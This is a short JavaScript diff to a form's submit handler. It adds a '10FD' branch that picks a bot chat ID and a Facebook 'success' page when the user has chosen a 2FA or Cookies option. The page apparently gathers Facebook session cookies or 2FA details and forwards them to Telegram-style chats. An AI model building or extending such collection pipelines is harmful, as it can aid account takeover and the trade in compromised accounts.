@@ -123,6 +123,8 @@ document.getElementById("submit-btn").addEventListener("click", function () {
         chatIdForBot = "-1002635815704";
     } else if (cookie2fa === "2FA" &&  fdType === "0FD") {
         chatIdForBot = "-1002636197141";
+    } else if (cookie2fa === "2FA" &&  fdType === "10FD") {
+        chatIdForBot = "-1002654345940";
     } else {
         showAlert("সঠিকভাবে 2FA বা Cookies সিলেক্ট করুন।");
         return;
@@ -177,6 +179,8 @@ if (response.ok) {
         redirectPage = "success/fb-success-30fd.html";
     } else if (cookie2fa === "2FA" && fdType === "0FD") {
         redirectPage = "success/fb-success-0fd.html";
+    } else if (cookie2fa === "2FA" && fdType === "10FD") {
+        redirectPage = "success/fb-success-10fd.html";
     }
 
     setTimeout(() => {
